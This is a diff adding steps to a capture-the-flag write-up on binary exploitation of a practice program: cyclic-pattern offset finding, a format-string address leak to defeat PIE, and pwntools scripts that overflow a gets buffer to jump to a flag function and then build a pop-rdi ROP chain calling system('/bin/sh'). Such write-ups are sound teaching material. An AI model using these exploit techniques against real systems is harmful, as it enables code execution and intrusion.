@@ -184,11 +184,42 @@ gets((char *)&local_42);
 puts("NB: Your instruction will not be recorded for the moment. We will fix the problem one day!");
 ```
 
-The `gets` function call does not check buffer size and can seemingly overflow. But since `PIE` is enabled, we can't directly use function addresses to overflow the `RIP` register.
+The `gets` function call does not check buffer size and can seemingly overflow. But since `PIE` is enabled, we can't directly use function addresses to overflow the `rip` register.
 
 Looking at the decompiled functions, we can find a `flag` function which prints the `flag2.txt` file directly, so this is where we want to jump to.
 
 ![flag function](./img/flag_fn.png)
+
+### Calculating the overflow offset 
+
+First we want to make sure we can overflow with `gets` and calculate the offset at which we overwrite the `rip` register.
+
+Let's first print a cyclic string to calculate the offset
+
+```python
+python
+import pwn
+pwn.cyclic(150)
+# aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
+```
+
+Then let's open the executable in GDB, and print a cyclic string into the `gets` function. I use [gdb peda](https://github.com/longld/peda) to add some functionality to GDB.
+
+Enter the `admin` function with `57005` and the `bubbles1` password, then print the cyclic string. The program should get a segmentation fault
+
+```bash
+gdb ./chal1
+run
+57005
+bubbles1
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
+```
+
+![sigsegv](./img/sigsegv.png)
+
+We see that `rsp` contains our cyclic string. Copy the first 4 bytes `aara` and paste them in python pwntools `pwn.cyclic_find('aara')` to obtain the offset `66`. We will use that as padding to overwrite the return pointer later.
+
+### Leaking an address
 
 Now we are looking for a print string vulnerability that would leak an address on the stack to bypass the `PIE` restriction.
 
@@ -204,7 +235,7 @@ Let's first note what the address for this instruction is in the assembly sectio
 
 ![printf call addr](./img/printf_call_addr.png)
 
-Now let's open GDB and `disass vote`, and set a breakpoint to the function instruction offset. I use [gdb peda](https://github.com/longld/peda) to add some functionality to GDB.
+Now let's open GDB and `disass vote`, and set a breakpoint to the function instruction offset. 
 
 ```bash
 gdb ./chal1
@@ -244,4 +275,131 @@ Note the address `0x001020c7` of this instruction.
 
 Now we will try to leak the `0x5555555560c7` instruction with `%p` format strings. Note that the instruction address will change every time the executable is run, so we are looking for the "shape" `0x5555` when leaking.
 
+We can use the `%<number>$<format>` format string to print addresses with a specific offset since the address we are looking for isn't directly leaked with `%p`. the `%1$p`, `%2$p`, `%3$p`,`%4$p`, `%5$p` will leak the registers `rsi`, `rdx`, `rcx`, `r8` and `r9` respectively because of how 64bit arguments are passed, the other arguments are taken directly on the stack. So we can use `%6$p` onwards to leak stack addresses.
+
+Looking at the stack before the printf call we see that we have to use the `%11$p` offset (annoted on the screenshot) to leak the correct address.
+
+![stack before printf](./img/stack_before_printf.png)
+
+![leaked addr](./img/leaked_addr.png)
+
+Perfect now we can calculate the base address by calculating `0x5555555560c7 - 0x001020c7`, then we can add any other "static" address onto it to redirect execution, effectively bypassing `PIE`. 
+
+### Automating the exploit with pwntools
+
+Now we want to create a `pwntools` script that will automate this process for us. It will first leak the address, then go back to the main menu, go to the hidden menu, enter the password, then enter the calculated address of the `flag` function at the correct offset to redirect execution to print the flag.
+
+```python
+from pwn import *
+
+context(os='linux', arch='amd64')
+
+filename = "./chal1"
+offset = 66
+
+context.binary = elf = ELF(filename)
+
+# p = remote('pwn.challenges.hfctf.ca', 1234)
+p = process(filename)
+
+padding = b"A" * offset
+
+def extract_address(input_bytes):
+    return input_bytes.decode('utf-8').split(': ')[1].strip()
+
+p.sendline(b'3')
+p.sendlineafter(b'Submit the game ID:\n', b'1')
+p.sendlineafter(b'Submit your vote (UP or DOWN):', b'%11$p')
+p.sendline() # the program expects a second newline for some reason
+
+p.recvline() 
+out = p.recvline()
+addr = extract_address(out)
+
+base_addr = int(addr, 16) - 0x001020c7
+flag_function_addr = base_addr + 0x00101f18
+
+p.sendlineafter(b'Type 1 for yes or anything else for no:', b'n')
+p.sendline(b'57005')
+p.sendline(b'bubbles1')
+
+payload = padding + p64(flag_function_addr)
+
+p.sendlineafter(b'You\'re admin! We can trust you! Give us your instruction!', payload)
+
+p.interactive()
+```
+
+Then execute it `python exploit2.py` (you would uncomment the remote part if it was the actual challenge)
+
+![second flag](./img/second_flag.png)
+
+
 ## Part 3 (pwn, 300 pts)
+
+For the last part it is suggested that we try running a `/bin/sh` shell after obtaining the second flag so let's do that.
+
+Looking at the available functions, we see `testsystem` and `popopops` that are of interest. All we have to do is load `/bin/sh` in `rdi` (since `rdi` is the first argument of functions in 64 bit assembly) and then call `system`.
+
+`testsystem` calls the system function with `whoami`.
+
+![system](./img/system_decompile.png)
+
+`popopops` is basically a `pop rdi` ROP gadget.
+
+![popopops](./img/popopops.png)
+
+And knowing that the string `/bin/sh` was present in the `flag` function, it means we could use it in our exploit easily.
+
+![binsh](./img/binsh.png)
+
+The idea here is to find the address of the `/bin/sh` string, the `system` call and the `pop rdi` gadget to build a simple ROP chain.
+
+So, to get the address of `/bin/sh` let's first take a look at where the full string containing it is in Ghidra
+
+![binsh ghidra full](./img/bin_sh_full_location.png)
+
+The beginning of the string is at `0x001037e8`, we simply have to calculate by how much we should increment this value so that the string starts at `/bin/sh`
+
+![python binsh](./img/calculating_binsh.png)
+
+The `/bin/sh` string would then be at `0x00103806`
+
+Now the address for system is straightforward `0x00102112`
+
+![system addr](./img/system_addr.png)
+
+And the address of `pop rdi` is also straightforward: `0x0010211e` 
+
+![pop rdi addr](./img/poprdi_addr.png)
+
+Now, using the leaked address from part two we can build the rop chain and call `system("/bin/sh")` with this simple rop chain
+
+Here's the updated pwntools script, only the last section for the payload is changed
+
+```python
+# ...
+base_addr = int(addr, 16) - 0x001020c7
+flag_function_addr = base_addr + 0x00101f18
+bin_sh_addr = base_addr + 0x00103806
+pop_rdi_addr = base_addr + 0x0010211e
+system_addr = base_addr + 0x00102112
+
+p.sendlineafter(b'Type 1 for yes or anything else for no:', b'n')
+p.sendline(b'57005')
+p.sendline(b'bubbles1')
+
+# First we call pop rdi, which takes the bin/sh address from the stack and puts it in rdi
+# then it returns to system
+payload = padding + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)
+
+p.sendlineafter(b'You\'re admin! We can trust you! Give us your instruction!', payload)
+
+p.interactive()
+```
+
+Running it gives a `/bin/sh` shell which we use to print the flag
+
+![flag3](./img/flag3.png)
+
+I really enjoyed this challenge, I hope to see pwn challenges again next year!
